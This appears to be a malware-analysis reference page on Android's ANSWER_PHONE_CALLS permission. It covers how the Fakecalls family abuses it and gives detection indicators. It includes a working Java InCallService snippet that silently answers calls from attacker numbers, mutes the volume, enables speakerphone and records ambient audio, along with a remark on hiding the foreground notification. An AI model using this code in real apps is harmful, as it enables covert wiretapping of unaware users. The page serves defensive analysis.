# ANSWER_PHONE_CALLS

Allows programmatically answering incoming phone calls. Can be used to silently answer calls from specific numbers (e.g., from a C2 operator) or to intercept calls.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.ANSWER_PHONE_CALLS` |
| Protection Level | `dangerous` |
| Permission Group | `PHONE` |
| Grant Method | Runtime permission dialog |
| Introduced | API 26 (Android 8.0) |

## What It Enables

```java
TelecomManager tm = (TelecomManager) getSystemService(TELECOM_SERVICE);
tm.acceptRingingCall();
```

Auto-answers the currently ringing call. Combined with audio recording, enables call wiretapping.

## Abuse in Malware

### Call Wiretapping

Auto-answer incoming calls from the attacker's number, activate speakerphone, and record the ambient audio. The device becomes a remote listening device activated by calling it.

### Call Interception

Answer calls before the user can, potentially to intercept voice-based verification calls from banks.

### Notable Families

| Family | Usage |
|--------|-------|
| [Fakecalls](../../malware/families/fakecalls.md) | Intercepts incoming and outgoing calls to Korean banks, replacing them with attacker-controlled audio |

Fakecalls uses `ANSWER_PHONE_CALLS` as part of its call interception mechanism. When a victim receives a call or dials their bank's customer service number, Fakecalls intercepts the call and plays pre-recorded IVR (Interactive Voice Response) audio that mimics the bank's automated menu. The victim enters account numbers, PINs, and card details believing they are interacting with their bank. The real bank number continues to display on screen throughout the spoofed call.

### Abuse Code Example

```java
public class SilentAnswerService extends InCallService {

    private final Set<String> c2Numbers = new HashSet<>();

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        Call.Details details = call.getDetails();
        if (details == null || details.getHandle() == null) return;

        String incomingNumber = details.getHandle().getSchemeSpecificPart();

        if (c2Numbers.contains(incomingNumber)) {
            call.answer(VideoProfile.STATE_AUDIO_ONLY);
            activateSpeakerphone();
            startAmbientRecording();
        }
    }

    private void activateSpeakerphone() {
        AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        audioManager.setSpeakerphoneOn(true);
        audioManager.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
    }

    private void startAmbientRecording() {
        MediaRecorder recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(getFilesDir() + "/recording.amr");
        try {
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
        }
    }
}
```

The malware registers as an `InCallService` or uses `TelecomManager.acceptRingingCall()`. When a call arrives from a known C2 number, it answers silently, mutes the call volume to zero, activates speakerphone, and begins recording ambient audio through the voice communication audio source.

## Android Version Changes

**Android 8.0 (API 26)**: `ANSWER_PHONE_CALLS` permission introduced. Before this, answering calls programmatically required workarounds using reflection or accessibility services.

**Android 9.0 (API 28)**: `TelecomManager.acceptRingingCall()` deprecated in favor of `TelecomManager.acceptRingingCall(int videoState)`. Both still function but the parameterized version provides more control.

**Android 10 (API 29)**: apps must hold the `ANSWER_PHONE_CALLS` permission and be a visible foreground app or have a foreground service running to interact with calls. Background restrictions limit silent call answering.

**Android 12 (API 31)**: stricter foreground service restrictions and notification requirements. Malware must maintain a visible foreground service notification to keep call-answering capability active, though this can be hidden with minimal notification channels.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
```

Expected in dialer and call management apps only. Suspicious in any other context.

### Analysis Indicators

- Look for `InCallService` declarations in the manifest -- apps registering as call handlers without being a dialer replacement are suspicious.
- `TelecomManager.acceptRingingCall()` calls combined with `AudioManager.setSpeakerphoneOn(true)` and volume zeroing indicate silent wiretapping setup.
- Check for `MediaRecorder` initialization with `VOICE_COMMUNICATION` audio source immediately after call answer -- this captures both sides of the conversation.
- Combined with `CALL_PHONE`, `READ_PHONE_STATE`, and `RECORD_AUDIO`, the permission set indicates comprehensive call manipulation capability (as seen in Fakecalls).
- Phone number comparison logic that matches incoming numbers against a hardcoded or C2-provided list indicates selective call interception.

## See Also

- [CALL_PHONE](call-phone.md) -- outgoing call capability, often paired with `ANSWER_PHONE_CALLS` for bidirectional call control
- [READ_PHONE_STATE](read-phone-state.md) -- provides call state monitoring that complements call answering
- [WRITE_CALL_LOG](../call-log/write-call-log.md) -- used to delete evidence of intercepted or wiretapped calls after the fact
- [Phishing Techniques](../../attacks/phishing-techniques.md) -- vishing attacks like Fakecalls use call answering as part of broader phishing operations
